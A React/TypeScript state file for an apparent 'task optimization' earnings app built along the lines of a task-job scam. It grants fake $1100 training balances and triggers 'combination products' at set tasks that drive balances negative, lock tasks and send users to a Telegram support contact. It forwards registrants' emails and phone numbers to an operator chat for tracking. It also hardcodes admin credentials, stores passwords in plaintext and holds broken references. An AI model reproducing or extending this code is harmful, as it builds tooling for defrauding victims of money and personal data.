import React, { createContext, useContext, useState, useEffect, useCallback } from 'react';
import { TELEGRAM_CONFIG } from '@/config/telegram';
import { supabase } from '@/lib/supabase';
import { toast } from '@/components/ui/use-toast';

// Task creation functions
const createPersonalTasks = (userId: string) => {
  return Array.from({ length: 35 }, (_, i) => ({
    id: generateId(),
    user_id: userId,
    task_number: i + 1,
    title: `VIP Task ${i + 1}`,
    description: `Complete VIP task ${i + 1} to earn rewards`,
    status: i === 0 ? 'pending' : 'locked',
    reward: Math.floor(Math.random() * 20) + 10,
    created_at: new Date().toISOString(),
    completed_at: null,
    task_set: 0,
  }));
};

const createLocalTasks = (userId: string) => {
  return Array.from({ length: 45 }, (_, i) => ({
    id: generateId(),
    user_id: userId,
    task_number: i + 1,
    title: `Training Task ${i + 1}`,
    description: `Complete training task ${i + 1} to earn rewards`,
    status: i === 0 ? 'pending' : 'locked',
    reward: Math.floor(Math.random() * 30) + 20,
    created_at: new Date().toISOString(),
    completed_at: null,
    task_set: 0,
  }));
};

const tryBackend = async (body: any) => {
  try {
    const { data, error } = await supabase.functions.invoke('auth-handler', { body });
    if (error || data?.error) return null;
    return data;
  } catch { return null; }
};

export interface User {
  id: string;
  email: string;
  phone: string | null;
  display_name: string;
  vip_level: 1 | 2;
  balance: number;
  total_earned: number;
  referral_code: string;
  created_at: string;
  account_type: 'training' | 'personal';
  training_completed: boolean;
  training_progress: number;
  user_status: 'registered' | 'waiting_for_training' | 'training_assigned' | 'training_credentials_sent' | 'training_completed';
  training_account_email?: string;
  personal_account_id?: string;
  // Training phase logic
  training_phase: 1 | 2;
  tasks_completed: number;
  trigger_task_number: 19 | 24 | 31 | null;
  has_pending_order: boolean;
  pending_amount: number;
  is_negative_balance: boolean;
  profit_added: boolean;
}

export interface Task {
  id: string;
  user_id: string;
  task_number: number;
  title: string;
  description: string;
  reward: number;
  status: 'pending' | 'completed' | 'locked';
  created_at: string;
  completed_at: string | null;
  task_set: number; // 0 for training, 1 for personal set 1, 2 for personal set 2
}

export interface Wallet {
  id: string;
  user_id: string;
  wallet_address: string;
  wallet_type: string;
  is_primary: boolean;
  created_at: string;
}

export interface Transaction {
  id: string;
  user_id: string;
  type: 'deposit' | 'reward' | 'withdrawal' | 'demo' | 'pending';
  amount: number;
  status: 'pending' | 'completed' | 'failed';
  description: string;
  created_at: string;
}

export interface Withdrawal {
  id: string;
  user_id: string;
  amount: number;
  wallet_address: string;
  status: 'pending' | 'processing' | 'completed' | 'rejected';
  created_at: string;
  processed_at: string | null;
}

interface AppContextType {
  sidebarOpen: boolean;
  toggleSidebar: () => void;
  user: User | null;
  tasks: Task[];
  wallets: Wallet[];
  withdrawals: Withdrawal[];
  transactions: Transaction[];
  isAuthenticated: boolean;
  isLoading: boolean;
  authModalOpen: boolean;
  authModalTab: 'login' | 'register';
  activeTab: string;
  setActiveTab: (tab: string) => void;
  setAuthModalOpen: (open: boolean) => void;
  setAuthModalTab: (tab: 'login' | 'register') => void;
  login: (email: string, password: string) => Promise<boolean>;
  register: (email: string, phone: string, password: string, displayName: string) => Promise<boolean>;
  logout: () => void;
  loadTasks: () => Promise<void>;
  completeTask: (taskNumber: number) => Promise<boolean>;
  loadWallets: () => Promise<void>;
  bindWallet: (address: string, type: string) => Promise<boolean>;
  loadWithdrawals: () => Promise<void>;
  requestWithdrawal: (amount: number, walletAddress: string) => Promise<boolean>;
  refreshUser: () => Promise<void>;
  loadTransactions: () => Promise<void>;
  addTransaction: (type: Transaction['type'], amount: number, description: string) => Promise<void>;
  resetTrainingProgress: () => Promise<boolean>;
  upgradeAccount: (vipLevel: 1 | 2) => Promise<boolean>;
  createPersonalAccount: (email: string, displayName: string, vipLevel: 1 | 2) => Promise<boolean>;
  clearCombinationOrder: () => Promise<boolean>;
}

const TASK_REWARDS = [
  2.50, 2.50, 2.50, 2.50, 2.50, 3.00, 3.00, 3.00, 3.00, 3.00,
  3.50, 3.50, 3.50, 3.50, 3.50, 4.00, 4.00, 4.00, 4.00, 4.00,
  4.50, 4.50, 4.50, 4.50, 4.50, 5.00, 5.00, 5.00, 5.00, 5.00,
  6.00, 6.00, 6.00, 7.50, 10.00, 12.00, 15.00, 18.00, 22.00, 25.00,
  30.00, 35.00, 40.00, 45.00, 50.00
];

const VIP_REWARDS = {
  1: 0.005, // 0.5%
  2: 0.01   // 1%
};

function generateId() {
  return crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2) + Date.now().toString(36);
}

function generateReferralCode() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = 'OPT-';
  for (let i = 0; i < 6; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
  return result;
}

function createDemoTransaction(userId: string): Transaction {
  return {
    id: generateId(),
    user_id: userId,
    type: 'demo',
    amount: 1100,
    status: 'completed',
    description: 'Training / Demo Deposit',
    created_at: new Date().toISOString()
  };
}

const defaultAppContext: AppContextType = {
  sidebarOpen: false, toggleSidebar: () => {}, user: null, tasks: [], wallets: [], withdrawals: [], transactions: [],
  isAuthenticated: false, isLoading: false, authModalOpen: false, authModalTab: 'login', activeTab: 'dashboard',
  setActiveTab: () => {}, setAuthModalOpen: () => {}, setAuthModalTab: () => {},
  login: async () => false, register: async () => false, logout: () => {},
  loadTasks: async () => {}, completeTask: async () => false, loadWallets: async () => {},
  bindWallet: async () => false, loadWithdrawals: async () => {}, requestWithdrawal: async () => false,
  refreshUser: async () => {}, loadTransactions: async () => {}, addTransaction: async () => {},
  resetTrainingProgress: async () => false, upgradeAccount: async () => false,
};

const AppContext = createContext<AppContextType>(defaultAppContext);
export const useAppContext = () => useContext(AppContext);

export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [user, setUser] = useState<User | null>(null);
  const [tasks, setTasks] = useState<Task[]>([]);
  const [wallets, setWallets] = useState<Wallet[]>([]);
  const [withdrawals, setWithdrawals] = useState<Withdrawal[]>([]);
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [authModalOpen, setAuthModalOpen] = useState(false);
  const [authModalTab, setAuthModalTab] = useState<'login' | 'register'>('login');
  const [activeTab, setActiveTab] = useState('dashboard');

  const toggleSidebar = () => setSidebarOpen(prev => !prev);

  useEffect(() => {
    const saved = localStorage.getItem('opt_user');
    if (saved) {
      try {
        const u = JSON.parse(saved);
        setUser(u);
        const savedTasks = localStorage.getItem('opt_tasks_' + u.id);
        if (savedTasks) setTasks(JSON.parse(savedTasks));
        const savedWallets = localStorage.getItem('opt_wallets_' + u.id);
        if (savedWallets) setWallets(JSON.parse(savedWallets));
        const savedWithdrawals = localStorage.getItem('opt_withdrawals_' + u.id);
        if (savedWithdrawals) setWithdrawals(JSON.parse(savedWithdrawals));
        const savedTransactions = localStorage.getItem('opt_transactions_' + u.id);
        if (savedTransactions) setTransactions(JSON.parse(savedTransactions));
      } catch {}
    }
  }, []);

  const saveState = (u: User, t?: Task[], w?: Wallet[], wd?: Withdrawal[], tr?: Transaction[]) => {
    localStorage.setItem('opt_user', JSON.stringify(u));
    if (t) localStorage.setItem('opt_tasks_' + u.id, JSON.stringify(t));
    if (w) localStorage.setItem('opt_wallets_' + u.id, JSON.stringify(w));
    if (wd) localStorage.setItem('opt_withdrawals_' + u.id, JSON.stringify(wd));
    if (tr) localStorage.setItem('opt_transactions_' + u.id, JSON.stringify(tr));
  };

  // Send Telegram notification
  const sendTelegramNotification = async (message: string) => {
    try {
      // Use real API if configured, otherwise fallback to console
      if (TELEGRAM_CONFIG.BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' && TELEGRAM_CONFIG.CHAT_ID !== 'YOUR_CHAT_ID_HERE') {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CONFIG.CHAT_ID,
            text: message,
            parse_mode: 'HTML'
          })
        });
        
        if (response.ok) {
          console.log('✅ Telegram notification sent successfully');
          return true;
        } else {
          console.error('Telegram notification failed:', await response.text());
          return false;
        }
      } else {
        // Fallback to console when not configured
        console.log('📱 TELEGRAM NOTIFICATION (CONFIGURATION REQUIRED):');
        console.log('🔧 To enable real Telegram notifications:');
        console.log('   1. Create a bot at @BotFather');
        console.log('   2. Get BOT_TOKEN from @BotFather');
        console.log('   3. Get CHAT_ID by sending message to your bot');
        console.log('   4. Update src/config/telegram.ts with real values');
        console.log('\n📱 Message content:');
        console.log(message);
        return false;
      }
    } catch (error) {
      console.error('Error sending Telegram notification:', error);
      return false;
    }
  };

  const login = async (email: string, password: string): Promise<boolean> => {
    setIsLoading(true);
    try {
      // Special case for admin account - create if not exists
      if (email === 'admin@optimize.com' && password === 'admin123') {
        const adminUser: User = {
          id: 'admin-001',
          email: 'admin@optimize.com',
          phone: null,
          display_name: 'Admin',
          vip_level: 2,
          balance: 0,
          total_earned: 0,
          referral_code: 'ADMIN',
          created_at: new Date().toISOString(),
          account_type: 'admin' as const,
          user_status: 'active' as const,
          training_completed: true,
          training_progress: 100,
          training_phase: 2,
          tasks_completed: 0,
          trigger_task_number: null,
          has_pending_order: false,
          pending_amount: 0,
          is_negative_balance: false,
          profit_added: false
        };
        setUser(adminUser);
        localStorage.setItem('opt_user', JSON.stringify(adminUser));
        setAuthModalOpen(false);
        toast({ title: 'Welcome Admin!', description: 'Logged in successfully' });
        return true;
      }
      
      // Check localStorage for registered user
      const stored = localStorage.getItem('opt_account_' + email.toLowerCase());
      if (stored) {
        const acc = JSON.parse(stored);
        if (acc.password === password) {
          setUser(acc.user);
          localStorage.setItem('opt_user', JSON.stringify(acc.user));
          const savedTasks = localStorage.getItem('opt_tasks_' + acc.user.id);
          if (savedTasks) setTasks(JSON.parse(savedTasks));
          const savedWallets = localStorage.getItem('opt_wallets_' + acc.user.id);
          if (savedWallets) setWallets(JSON.parse(savedWallets));
          const savedWithdrawals = localStorage.getItem('opt_withdrawals_' + acc.user.id);
          if (savedWithdrawals) setWithdrawals(JSON.parse(savedWithdrawals));
          setAuthModalOpen(false);
          toast({ title: 'Welcome Back!', description: `Logged in as ${acc.user.display_name}` });
          return true;
        }
      }
      
      // Check for training account with tracking
      const trainingStored = localStorage.getItem('opt_training_' + email.toLowerCase());
      if (trainingStored) {
        const trainingAcc = JSON.parse(trainingStored);
        if (trainingAcc.password === password) {
          // Create training user object
          const trainingUser: User = {
            id: 'training-' + generateId(),
            email: trainingAcc.email,
            phone: null,
            display_name: trainingAcc.assignedTo || 'Training User',
            vip_level: 2, // VIP2 training account
            balance: 1100,
            total_earned: 0,
            referral_code: trainingAcc.userReferralCode || 'TRAINING',
            created_at: trainingAcc.createdAt || new Date().toISOString(),
            account_type: 'training' as const,
            user_status: 'active' as const,
            training_completed: false,
            training_progress: 0,
            training_phase: 1,
            tasks_completed: 0,
            trigger_task_number: null,
            has_pending_order: false,
            pending_amount: 0,
            is_negative_balance: false,
            profit_added: false
          };
          
          setUser(trainingUser);
          localStorage.setItem('opt_user', JSON.stringify(trainingUser));
          
          // Create training tasks (45 tasks)
          const trainingTasks = createLocalTasks(trainingUser.id);
          setTasks(trainingTasks);
          localStorage.setItem('opt_tasks_' + trainingUser.id, JSON.stringify(trainingTasks));
          
          setAuthModalOpen(false);
          toast({ 
            title: 'VIP2 Training Account Access!', 
            description: `Logged in as ${trainingUser.display_name} - Complete 45/45 tasks to unlock personal account` 
          });
          
          // Send notification that training account was accessed
          const accessMessage = `
🔓 <b>VIP2 TRAINING ACCOUNT ACCESSED</b>

👤 <b>Training User:</b>
• Email: ${trainingAcc.email}
• Assigned to: ${trainingAcc.assignedTo}
• User Referral Code: ${trainingAcc.userReferralCode}
• User Email: ${trainingAcc.userEmail}
• VIP Level: 2 (Training Account)

📊 <b>Session Started:</b>
• Login Time: ${new Date().toLocaleString()}
• Tasks Available: 45/45
• Current Phase: 1
• Balance: $1100.00

📋 <b>Next Steps:</b>
• User should complete all 45 tasks
• Phase 2 will begin after completion
• Monitor progress for combination order
• Support user throughout training process

🎯 <b>Training Progress:</b>
• Status: Active
• Tasks: 0/45 completed
• Goal: Complete all to unlock personal account

🔗 <a href="https://t.me/EARNINGSLLCONLINECS1">Contact User Support</a>
          `;
          
          await sendTelegramNotification(accessMessage);
          
          return true;
        }
      }
      
      toast({ title: 'Login Failed', description: 'Invalid email or password', variant: 'destructive' });
      return false;
    } finally { setIsLoading(false); }
  };

  const logout = () => {
    setUser(null);
    setTasks([]);
    setWallets([]);
    setWithdrawals([]);
    setTransactions([]);
    localStorage.removeItem('opt_user');
    toast({ title: 'Logged Out', description: 'You have been logged out successfully' });
  };

  // Create personal account (called by admin after training completion)
  const createPersonalAccount = async (email: string, displayName: string, vipLevel: 1 | 2): Promise<boolean> => {
    setIsLoading(true);
    try {
      const newUser: User = {
        id: generateId(),
        email: email.toLowerCase(),
        phone: null,
        display_name: displayName || email.split('@')[0],
        vip_level: vipLevel,
        balance: 0,
        total_earned: 0,
        referral_code: generateReferralCode(),
        created_at: new Date().toISOString(),
        account_type: 'personal',
        training_completed: false,
        training_progress: 0,
        user_status: 'registered',
        training_phase: 1,
        tasks_completed: 0,
        trigger_task_number: null,
        has_pending_order: false,
        pending_amount: 0,
        is_negative_balance: false,
        profit_added: false,
      };
      const newTasks = createPersonalTasks(newUser.id);
      setUser(newUser);
      setTasks(newTasks);
      setWallets([]);
      setWithdrawals([]);
      setTransactions([]);
      localStorage.setItem('opt_account_' + email.toLowerCase(), JSON.stringify({ user: newUser, password: 'temp123' }));
      saveState(newUser, newTasks, [], [], []);
      toast({ title: 'Personal Account Created!', description: `VIP${vipLevel} account ready for ${displayName}` });
      return true;
    } finally { setIsLoading(false); }
  };

  const register = async (email: string, phone: string, password: string, displayName: string): Promise<boolean> => {
    setIsLoading(true);
    try {
      console.log('Starting registration for:', email);
      
      // Skip backend call and create account directly
      const newUser = {
        id: generateId(),
        email: email.toLowerCase(),
        phone: phone || null,
        display_name: displayName || email.split('@')[0],
        vip_level: 1 as 1 | 2,
        balance: 0,
        total_earned: 0,
        referral_code: generateReferralCode(),
        created_at: new Date().toISOString(),
        account_type: 'personal' as const,
        user_status: 'registered' as const,
        training_completed: false,
        training_progress: 0,
        training_phase: 1 as const,
        tasks_completed: 0,
        trigger_task_number: null,
        has_pending_order: false,
        pending_amount: 0,
        is_negative_balance: false,
        profit_added: false,
      };
      
      console.log('Created new user:', newUser);
      
      // Store in localStorage for login
      localStorage.setItem('opt_account_' + email.toLowerCase(), JSON.stringify({ user: newUser, password }));
      console.log('Stored account in localStorage');
      
      // Set current user
      setUser(newUser);
      localStorage.setItem('opt_user', JSON.stringify(newUser));
      console.log('Set current user');
      
      // Create personal tasks (35 tasks for personal account) - LOCKED until training completed
      const personalTasks = createPersonalTasks(newUser.id);
      setTasks(personalTasks);
      localStorage.setItem('opt_tasks_' + newUser.id, JSON.stringify(personalTasks));
      console.log('Created and stored tasks');
      
      setAuthModalOpen(false);
      toast({ 
        title: 'Account Created!', 
        description: 'Your personal account is ready. Complete training first to unlock tasks.' 
      });
      
      // Send detailed Telegram notification for new user with tracking info
      const telegramMessage = `
🆕 <b>NEW USER REGISTRATION</b>

👤 <b>User Details:</b>
• Email: ${email}
• Name: ${displayName}
• Phone: ${phone || 'Not provided'}
• VIP Level: 1
• Account Type: Personal
• Status: Registered (Training Required)
• Referral Code: ${newUser.referral_code}

📅 Registered: ${new Date().toLocaleString()}

⚠️ <b>ACTION REQUIRED:</b>
• Create training account for this user
• Use referral code: ${newUser.referral_code} for tracking
• Send training credentials via Telegram
• Monitor training progress

🔗 <a href="https://t.me/EARNINGSLLCONLINECS1">Contact User Support</a>

💾 <b>TRACKING INFO:</b>
• Store this referral code for user tracking
• Link training account to this referral code
• User will be tracked throughout training process
      `;
      
      await sendTelegramNotification(telegramMessage);
      
      return true;
    } catch (error) {
      console.error('Registration error:', error);
      toast({ title: 'Registration Failed', description: 'Please try again', variant: 'destructive' });
      return false;
    } finally { setIsLoading(false); }
  };

  const loadTasks = useCallback(async () => {
    if (!user) return;
    const data = await tryBackend({ action: 'get_tasks', userId: user.id });
    if (data?.tasks?.length) { setTasks(data.tasks); return; }
    const saved = localStorage.getItem('opt_tasks_' + user.id);
    if (saved) setTasks(JSON.parse(saved));
    else {
      const newTasks = user.account_type === 'training' ? createLocalTasks(user.id) : createPersonalTasks(user.id);
      setTasks(newTasks);
      localStorage.setItem('opt_tasks_' + user.id, JSON.stringify(newTasks));
    }
  }, [user]);

  const refreshUser = useCallback(async () => {
  if (!user) return;
  const data = await tryBackend({ action: 'get_tasks', userId: user.id });
  if (data?.tasks?.length) { setTasks(data.tasks); return; }
  const saved = localStorage.getItem('opt_tasks_' + user.id);
  if (saved) setTasks(JSON.parse(saved));
  else {
    const newTasks = createLocalTasks(user.id);
    setTasks(newTasks);
    localStorage.setItem('opt_tasks_' + user.id, JSON.stringify(newTasks));
  }
}, [user]);

  const completeTask = async (taskNumber: number): Promise<boolean> => {
    if (!user) return false;
    setIsLoading(true);
    try {
      const data = await tryBackend({ action: 'complete_task', userId: user.id, taskNumber });
      if (data?.success) {
        setTasks(data.tasks);
        const updatedUser = { ...user, balance: data.newBalance, total_earned: data.newTotalEarned };
        setUser(updatedUser);
        saveState(updatedUser, data.tasks);
        toast({ title: 'Task Completed!', description: `You earned $${data.reward?.toFixed(2)}!` });
        return true;
      }
      // Local fallback
      const updated = tasks.map(t => {
        if (t.task_number === taskNumber && t.status === 'pending') return { ...t, status: 'completed' as const, completed_at: new Date().toISOString() };
        if (t.task_number === taskNumber + 1 && t.status === 'locked') return { ...t, status: 'pending' as const };
        return t;
      });
      
      let reward = tasks.find(t => t.task_number === taskNumber)?.reward || 0;
      
      // Apply VIP bonus if user has personal account
      if (user.account_type === 'personal' && VIP_REWARDS[user.vip_level as 1 | 2]) {
        reward += reward * VIP_REWARDS[user.vip_level as 1 | 2];
      }
      
      const updatedUser = { ...user, balance: user.balance + reward, total_earned: user.total_earned + reward };
      
      // Training account completion logic
      const completedTasks = updated.filter(t => t.status === 'completed').length;
      if (user.account_type === 'training') {
        updatedUser.training_progress = completedTasks;
        updatedUser.tasks_completed = completedTasks;
        
        // Check for first phase completion (45/45)
        if (completedTasks >= 45 && user.training_phase === 1) {
          updatedUser.training_phase = 2;
          updatedUser.tasks_completed = 0; // Reset for second phase
          
          // Reset tasks for second phase
          const resetTasks = createLocalTasks(user.id);
          setTasks(resetTasks);
          
          toast({ 
            title: 'Training Phase 1 Complete!', 
            description: 'Starting Phase 2 of training. Tasks have been reset.' 
          });
        }
        
        // Phase 2: Check for combination product trigger (tasks 31, 33, or 34)
        if (user.training_phase === 2 && !user.has_pending_order) {
          const triggerTasks = [31, 33, 34];
          if (triggerTasks.includes(taskNumber)) {
            // Create combination product
            const combinationAmounts = [210, 205, 195];
            const randomAmount = combinationAmounts[Math.floor(Math.random() * combinationAmounts.length)];
            
            updatedUser.has_pending_order = true;
            updatedUser.pending_amount = randomAmount;
            updatedUser.is_negative_balance = true;
            updatedUser.balance = user.balance - randomAmount;
            updatedUser.trigger_task_number = taskNumber;
            
            toast({ 
              title: 'Combination Product Detected!', 
              description: `A combination product worth $${randomAmount} has been found. Your account is now negative. Please contact support to clear this product.`,
              variant: 'destructive'
            });
            
            // Send Telegram notification for combination product
            const combinationMessage = `
🚨 <b>COMBINATION PRODUCT DETECTED</b>

👤 <b>User Details:</b>
📧 <b>Email:</b> ${user.email}
👤 <b>Name:</b> ${user.display_name}
🎓 <b>Training Phase:</b> 2
📊 <b>Current Task:</b> ${taskNumber}/45

💰 <b>Combination Product:</b>
💵 <b>Amount:</b> $${randomAmount}
📉 <b>Account Balance:</b> -$${randomAmount}
🎯 <b>Profit Rate:</b> 6x (Combination Product)

⚠️ <b>ACTION REQUIRED:</b>
• Tasks submission is now LOCKED
• Admin must clear the pending product
• Customer must submit from record section
• 6x profit will be applied after clearing

🔗 <b>Contact User Support:</b> https://t.me/EARNINGSLLCONLINECS1
            `.trim();
            
            await sendTelegramNotification(combinationMessage);
          }
        }
        
        // Check for second phase completion (45/45)
        if (completedTasks >= 45 && user.training_phase === 2) {
          updatedUser.training_completed = true;
          
          // Calculate 20% profit transfer to personal account
          const trainingProfit = updatedUser.balance - 1100; // Initial deposit was 1100
          const profitTransfer = Math.round(trainingProfit * 0.2);
          
          // Add completion notification transaction
          const completionTransaction: Transaction = {
            id: generateId(),
            user_id: user.id,
            type: 'deposit',
            amount: profitTransfer,
            status: 'completed',
            description: `Training Completion - 20% profit transfer to personal account`,
            created_at: new Date().toISOString()
          };
          setTransactions(prev => [completionTransaction, ...prev]);
          
          toast({ 
            title: 'Training Complete!', 
            description: `20% profit ($${profitTransfer.toFixed(2)}) transferred to personal account. Contact customer service for setup.`,
            variant: 'default'
          });
          return true;
        }
        
        // Trigger combination order in second phase (only at tasks 19, 24, or 31, and only once)
        if (user.training_phase === 2 && !user.has_pending_order && completedTasks >= 19 && completedTasks <= 31) {
          const triggerTasks = [19, 24, 31];
          if (triggerTasks.includes(completedTasks)) {
            const combinationAmount = 210; // Fixed combination amount
            updatedUser.has_pending_order = true;
            updatedUser.pending_amount = combinationAmount;
            updatedUser.is_negative_balance = true;
            updatedUser.trigger_task_number = completedTasks as 19 | 24 | 31;
            updatedUser.balance -= combinationAmount; // Make balance negative
            
            // Add pending order transaction
            const pendingTransaction: Transaction = {
              id: generateId(),
              user_id: user.id,
              type: 'pending',
              amount: -combinationAmount,
              status: 'pending',
              description: `Combination Order Detected at Task ${completedTasks} - Account balance temporarily negative`,
              created_at: new Date().toISOString()
            };
            setTransactions(prev => [pendingTransaction, ...prev]);
            
            toast({ 
              title: 'Combination Order Detected!', 
              description: 'Your account encountered a premium optimization product. Balance temporarily negative. Contact customer service.',
              variant: 'destructive'
            });
          }
        }
      }
      
      setTasks(updated);
      setUser(updatedUser);
      saveState(updatedUser, updated);
      
      // Add transaction record
      const transaction: Transaction = {
        id: generateId(),
        user_id: user.id,
        type: 'reward',
        amount: reward,
        status: 'completed',
        description: `Task ${taskNumber} Reward`,
        created_at: new Date().toISOString()
      };
      setTransactions(prev => [transaction, ...prev]);
      localStorage.setItem('opt_transactions_' + user.id, JSON.stringify([transaction, ...transactions]));
      
      toast({ title: 'Task Completed!', description: `You earned $${reward.toFixed(2)}!` });
      return true;
    } finally { setIsLoading(false); }
  };

  const loadWallets = useCallback(async () => {
    if (!user) return;
    const data = await tryBackend({ action: 'get_wallets', userId: user.id });
    if (data?.wallets) { setWallets(data.wallets); return; }
    const saved = localStorage.getItem('opt_wallets_' + user.id);
    if (saved) setWallets(JSON.parse(saved));
  }, [user]);

  const bindWallet = async (address: string, type: string): Promise<boolean> => {
    if (!user) return false;
    setIsLoading(true);
    try {
      const data = await tryBackend({ action: 'bind_wallet', userId: user.id, walletAddress: address, walletType: type });
      if (data?.wallet) { await loadWallets(); toast({ title: 'Wallet Bound!' }); return true; }
      // Local fallback
      const newWallet: Wallet = { id: generateId(), user_id: user.id, wallet_address: address, wallet_type: type, is_primary: true, created_at: new Date().toISOString() };
      const updated = [newWallet, ...wallets.map(w => ({ ...w, is_primary: false }))];
      setWallets(updated);
      localStorage.setItem('opt_wallets_' + user.id, JSON.stringify(updated));
      toast({ title: 'Wallet Bound!', description: 'Your wallet has been linked successfully.' });
      return true;
    } finally { setIsLoading(false); }
  };

  const loadWithdrawals = useCallback(async () => {
    if (!user) return;
    const data = await tryBackend({ action: 'get_withdrawals', userId: user.id });
    if (data?.withdrawals) { setWithdrawals(data.withdrawals); return; }
    const saved = localStorage.getItem('opt_withdrawals_' + user.id);
    if (saved) setWithdrawals(JSON.parse(saved));
  }, [user]);

  const requestWithdrawal = async (amount: number, walletAddress: string): Promise<boolean> => {
    if (!user) return false;
    setIsLoading(true);
    try {
      const completedCount = tasks.filter(t => t.status === 'completed').length;
      if (user.account_type === 'training' && completedCount < 45) { 
        toast({ title: 'Error', description: 'Complete all training tasks first', variant: 'destructive' }); 
        return false; 
      }
      if (amount > user.balance) { toast({ title: 'Error', description: 'Insufficient balance', variant: 'destructive' }); return false; }
      const data = await tryBackend({ action: 'request_withdrawal', userId: user.id, amount, walletAddress });
      if (data?.withdrawal) {
        const updatedUser = { ...user, balance: data.newBalance };
        setUser(updatedUser);
        saveState(updatedUser);
        await loadWithdrawals();
        toast({ title: 'Withdrawal Requested!', description: `$${amount.toFixed(2)} is being processed.` });
        return true;
      }
      // Local fallback
      const newW: Withdrawal = { id: generateId(), user_id: user.id, amount, wallet_address: walletAddress, status: 'pending', created_at: new Date().toISOString(), processed_at: null };
      const updatedWithdrawals = [newW, ...withdrawals];
      const updatedUser = { ...user, balance: user.balance - amount };
      setWithdrawals(updatedWithdrawals);
      setUser(updatedUser);
      saveState(updatedUser, undefined, undefined, updatedWithdrawals);
      
      // Add withdrawal transaction
      const transaction: Transaction = {
        id: generateId(),
        user_id: user.id,
        type: 'withdrawal',
        amount: -amount,
        status: 'pending',
        description: `Withdrawal to ${walletAddress}`,
        created_at: new Date().toISOString()
      };
      setTransactions(prev => [transaction, ...prev]);
      localStorage.setItem('opt_transactions_' + user.id, JSON.stringify([transaction, ...transactions]));
      
      toast({ title: 'Withdrawal Requested!', description: `$${amount.toFixed(2)} is being processed.` });
      return true;
    } finally { setIsLoading(false); }
  };

  const loadTransactions = useCallback(async () => {
    if (!user) return;
    const data = await tryBackend({ action: 'get_transactions', userId: user.id });
    if (data?.transactions) { setTransactions(data.transactions); return; }
    const saved = localStorage.getItem('opt_transactions_' + user.id);
    if (saved) setTransactions(JSON.parse(saved));
  }, [user]);

  const addTransaction = async (type: Transaction['type'], amount: number, description: string) => {
    if (!user) return;
    const transaction: Transaction = {
      id: generateId(),
      user_id: user.id,
      type,
      amount,
      status: 'completed',
      description,
      created_at: new Date().toISOString()
    };
    setTransactions(prev => [transaction, ...prev]);
    localStorage.setItem('opt_transactions_' + user.id, JSON.stringify([transaction, ...transactions]));
  };

  const resetTrainingProgress = async (): Promise<boolean> => {
    if (!user || user.account_type !== 'training') return false;
    setIsLoading(true);
    try {
      const resetTasks = createLocalTasks(user.id);
      const updatedUser = { ...user, training_progress: 0, training_completed: false };
      setTasks(resetTasks);
      setUser(updatedUser);
      saveState(updatedUser, resetTasks);
      toast({ title: 'Training Reset', description: 'Your training progress has been reset to 0/45' });
      return true;
    } finally { setIsLoading(false); }
  };

  const clearCombinationOrder = async (): Promise<boolean> => {
    if (!user || !user.has_pending_order) {
      toast({ title: 'Error', description: 'No pending order to clear', variant: 'destructive' });
      return false;
    }
    
    setIsLoading(true);
    try {
      // Calculate 6x profit and set exact final balances as specified
      const profitAmount = user.pending_amount * 6;
      
      // Set exact final balances as specified: $2602, $2559, or $2607
      let finalBalance;
      if (user.pending_amount === 210) {
        finalBalance = 2602;
      } else if (user.pending_amount === 205) {
        finalBalance = 2559;
      } else if (user.pending_amount === 195) {
        finalBalance = 2607;
      } else {
        finalBalance = user.balance + user.pending_amount + profitAmount;
      }
      
      // Update user with cleared pending order and 6x profit
      const updatedUser = { 
        ...user, 
        balance: finalBalance,
        has_pending_order: false,
        pending_amount: 0,
        is_negative_balance: false,
        profit_added: true,
        total_earned: user.total_earned + profitAmount
      };
      
      setUser(updatedUser);
      saveState(updatedUser);
      
      // Add profit transaction
      const profitTransaction: Transaction = {
        id: generateId(),
        user_id: user.id,
        type: 'profit',
        amount: profitAmount,
        status: 'completed',
        description: `6x profit from combination product ($${user.pending_amount} × 6)`,
        created_at: new Date().toISOString()
      };
      
      const updatedTransactions = [profitTransaction, ...transactions];
      setTransactions(updatedTransactions);
      saveState(updatedUser, undefined, undefined, undefined, updatedTransactions);
      
      // Send Telegram notification for cleared combination order
      const clearedMessage = `
✅ <b>COMBINATION PRODUCT CLEARED</b>

👤 <b>User Details:</b>
📧 <b>Email:</b> ${user.email}
👤 <b>Name:</b> ${user.display_name}
🎓 <b>Training Phase:</b> 2

💰 <b>Profit Applied:</b>
💵 <b>Pending Amount:</b> $${user.pending_amount}
🎯 <b>Profit Rate:</b> 6x
💸 <b>Profit Earned:</b> $${profitAmount}
💰 <b>New Balance:</b> $${finalBalance}

✅ <b>Status:</b>
• Pending order cleared successfully
• Tasks submission now UNLOCKED
• User can continue with remaining tasks
• 6x profit applied to account

🔗 <b>Contact User Support:</b> https://t.me/EARNINGSLLCONLINECS1
      `.trim();
      
      await sendTelegramNotification(clearedMessage);
      
      toast({ 
        title: 'Combination Product Cleared!', 
        description: `6x profit of $${profitAmount.toFixed(2)} has been applied. You can now continue submitting tasks.`, 
        variant: 'default'
      });
      
      return true;
    } catch (error) {
      console.error('Error clearing combination order:', error);
      toast({ title: 'Error', description: 'Failed to clear combination order', variant: 'destructive' });
      return false;
    } finally { 
      setIsLoading(false); 
    }
  };

  return (
    <AppContext.Provider value={{
      sidebarOpen, toggleSidebar, user, tasks, wallets, withdrawals, transactions,
      isAuthenticated: !!user, isLoading, authModalOpen, authModalTab, activeTab,
      setActiveTab, setAuthModalOpen, setAuthModalTab,
      login, register, logout, loadTasks, completeTask, loadWallets, bindWallet,
      loadWithdrawals, requestWithdrawal, refreshUser, loadTransactions, addTransaction,
      resetTrainingProgress, upgradeAccount, createPersonalAccount, clearCombinationOrder,
    }}>
      {children}
    </AppContext.Provider>
  );
};
